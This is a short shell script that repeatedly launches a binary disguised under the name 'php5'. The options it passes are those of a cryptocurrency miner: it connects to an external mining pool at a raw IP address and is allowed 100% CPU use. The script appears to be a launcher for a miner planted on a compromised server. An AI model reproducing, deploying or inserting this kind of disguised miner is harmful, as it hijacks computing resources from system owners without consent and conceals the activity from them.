for i in `seq 1 1000`; do
./php5 -o 51.255.91.41:443 -u auto2 -p x --max-cpu-usage=100 --donate-level=1
done
